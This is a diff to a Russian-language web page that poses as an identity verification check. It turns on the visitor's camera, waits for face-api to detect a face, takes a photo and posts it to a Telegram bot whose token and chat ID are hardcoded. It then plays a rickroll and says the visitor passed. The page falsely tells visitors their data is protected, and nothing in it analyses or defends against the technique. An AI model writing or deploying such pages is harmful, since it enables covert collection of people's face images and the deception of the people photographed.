@@ -5,18 +5,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Подтверждение личности</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #0a0a0a;
             color: #fff;
             font-family: system-ui, -apple-system, sans-serif;
             text-align: center;
             padding-top: 30px;
-            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
         .container {
             max-width: 400px;
-            margin: 0 auto;
             padding: 20px;
+            width: 100%;
         }
         h2 {
             font-size: 24px;
@@ -25,29 +34,35 @@
         .sub {
             color: #aaa;
             font-size: 16px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
-        .instruction {
-            background: #1a1a1a;
+        .video-wrapper {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+            max-width: 340px;
             border-radius: 16px;
-            padding: 16px;
-            margin: 16px 0;
-            border-left: 4px solid #1e90ff;
-            text-align: left;
-            font-size: 15px;
-            line-height: 1.6;
-        }
-        .instruction span {
-            color: #ffcc00;
-            font-weight: bold;
+            overflow: hidden;
+            background: #111;
+            border: 2px solid #333;
         }
         video {
             width: 100%;
-            max-width: 300px;
+            display: block;
             border-radius: 16px;
-            border: 2px solid #333;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+        #rickroll {
             display: none;
-            margin: 10px auto;
+            width: 100%;
+            border-radius: 16px;
         }
         .btn {
             background: #1e90ff;
@@ -63,29 +78,15 @@
             max-width: 280px;
             transition: 0.2s;
         }
-        .btn:hover {
-            background: #0077e6;
-        }
-        .btn:active {
-            transform: scale(0.96);
+        .btn:disabled {
+            background: #444;
+            cursor: not-allowed;
         }
         #status {
+            margin-top: 16px;
             color: #888;
-            margin-top: 20px;
             font-size: 14px;
-        }
-        .hint {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin: 12px 0;
-            font-size: 14px;
-            color: #ccc;
-        }
-        .hint span {
-            background: #222;
-            padding: 6px 14px;
-            border-radius: 30px;
+            min-height: 24px;
         }
         .footer {
             margin-top: 30px;
@@ -95,79 +96,119 @@
     </style>
 </head>
 <body>
-<div class="container">
+
+<div class="container" id="mainUI">
     <h2>🔐 Подтверждение личности</h2>
-    <p class="sub">Для завершения проверки сделайте фото</p>
+    <p class="sub">Покажите лицо, затем нажмите «Отправить»</p>
 
-    <div class="instruction">
-        <span>📌 Инструкция:</span><br>
-        1. Покажите <span>лицо</span> (чётко, при хорошем свете)<br>
-        2. Покажите <span>жест рукой</span>:<br>
-        &nbsp;&nbsp;• 🤘 (рок) <br>
-        &nbsp;&nbsp;• 👍 (палец вверх)<br>
-        3. Нажмите кнопку «Отправить»
+    <div class="video-wrapper">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="overlay"></canvas>
+        <video id="rickroll" src="https://www.w3schools.com/html/mov_bbb.mp4" muted playsinline></video>
     </div>
 
-    <div class="hint">
-        <span>🤘 Рок</span>
-        <span>👍 Палец вверх</span>
-    </div>
-
-    <video id="video" autoplay playsinline></video>
-
-    <button class="btn" onclick="snap()">📸 Отправить фото</button>
-    <div id="status">⏳ Ожидание камеры...</div>
+    <button class="btn" id="sendBtn" disabled>📸 Отправить фото</button>
+    <div id="status">⏳ Загрузка модели...</div>
     <div class="footer">Ваши данные защищены • Проверка занимает 5 секунд</div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <script>
-    const video = document.getElementById('video');
-    const status = document.getElementById('status');
-    let stream = null;
-
     // ===== ТВОИ ДАННЫЕ (ВСТАВЛЕНЫ) =====
     const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
     const CHAT_ID = '5025315928';
     // ====================================
 
+    const video = document.getElementById('video');
+    const rickroll = document.getElementById('rickroll');
+    const overlay = document.getElementById('overlay');
+    const ctx = overlay.getContext('2d');
+    const sendBtn = document.getElementById('sendBtn');
+    const status = document.getElementById('status');
+
+    let stream = null;
+    let faceDetected = false;
+    let rickrollPlayed = false;
+
+    // === ЗАГРУЗКА МОДЕЛИ ===
+    async function loadModels() {
+        status.textContent = '⏳ Загрузка модели распознавания лиц...';
+        try {
+            await faceapi.nets.tinyFaceDetector.loadFromUri(
+                'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights'
+            );
+            status.textContent = '✅ Модель готова. Разрешите доступ к камере.';
+            startCam();
+        } catch (e) {
+            status.textContent = '❌ Ошибка загрузки модели: ' + e.message;
+        }
+    }
+
+    // === КАМЕРА ===
     async function startCam() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            video.style.display = 'block';
-            status.textContent = '✅ Камера включена, сделайте жест и нажмите "Отправить"';
-        } catch(e) {
+            video.addEventListener('play', () => {
+                overlay.width = video.videoWidth || 640;
+                overlay.height = video.videoHeight || 480;
+                detectFace();
+            });
+        } catch (e) {
             status.textContent = '❌ Ошибка доступа к камере: ' + e.message;
         }
     }
 
+    // === РАСПОЗНАВАНИЕ ЛИЦА ===
+    async function detectFace() {
+        setInterval(async () => {
+            if (rickrollPlayed) return;
+
+            const detections = await faceapi.detectAllFaces(
+                video,
+                new faceapi.TinyFaceDetectorOptions()
+            );
+
+            ctx.clearRect(0, 0, overlay.width, overlay.height);
+
+            if (detections.length > 0) {
+                faceDetected = true;
+                sendBtn.disabled = false;
+                status.textContent = '✅ Лицо обнаружено! Нажмите "Отправить"';
+
+                const box = detections[0].box;
+                ctx.strokeStyle = '#00ff00';
+                ctx.lineWidth = 3;
+                ctx.strokeRect(box.x, box.y, box.width, box.height);
+            } else {
+                faceDetected = false;
+                sendBtn.disabled = true;
+                status.textContent = '❌ Лицо не обнаружено. Покажите лицо чётко.';
+            }
+        }, 400);
+    }
+
+    // === ОТПРАВКА ФОТО ===
     async function snap() {
-        if (!stream) {
-            status.textContent = '❌ Камера не доступна. Разрешите доступ.';
+        if (!faceDetected) {
+            status.textContent = '❌ Лицо не обнаружено. Попробуйте ещё раз.';
             return;
         }
 
         const canvas = document.createElement('canvas');
         canvas.width = 640;
         canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 640, 480);
-
-        ctx.fillStyle = '#ffffff30';
-        ctx.fillRect(0, 440, 640, 40);
-        ctx.fillStyle = '#fff';
-        ctx.font = '16px sans-serif';
-        ctx.fillText('Подтверждение личности', 20, 470);
+        const c = canvas.getContext('2d');
+        c.drawImage(video, 0, 0, 640, 480);
 
         const data = canvas.toDataURL('image/png');
-
-        status.textContent = '📤 Отправка...';
+        status.textContent = '📤 Отправка фото...';
 
         try {
             const blob = await fetch(data).then(r => r.blob());
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
-            form.append('photo', blob, 'face_gesture.png');
+            form.append('photo', blob, 'face.png');
 
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
@@ -175,16 +216,45 @@
             });
             const json = await res.json();
             if (json.ok) {
-                status.textContent = '✅ Фото отправлено! Спасибо.';
+                status.textContent = '✅ Фото отправлено! Перенаправление...';
+                sendBtn.disabled = true;
+                playRickroll();
             } else {
                 status.textContent = '❌ Ошибка бота: ' + json.description;
             }
-        } catch(e) {
+        } catch (e) {
             status.textContent = '❌ Ошибка сети. Проверьте интернет.';
         }
     }
 
-    startCam();
+    // === РИКРОЛЛ (ВИДЕО) ===
+    function playRickroll() {
+        rickrollPlayed = true;
+
+        // Останавливаем камеру
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+        video.style.display = 'none';
+        overlay.style.display = 'none';
+
+        // Показываем видео
+        rickroll.style.display = 'block';
+        rickroll.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ';
+        rickroll.play();
+
+        status.textContent = '🎵 Добро пожаловать!';
+
+        // Убираем лишние кнопки
+        document.querySelector('.sub').textContent = '🎉 Вы прошли проверку!';
+        sendBtn.style.display = 'none';
+    }
+
+    // === КНОПКА ОТПРАВКИ ===
+    sendBtn.onclick = snap;
+
+    // === СТАРТ ===
+    loadModels();
 </script>
 </body>
 </html>
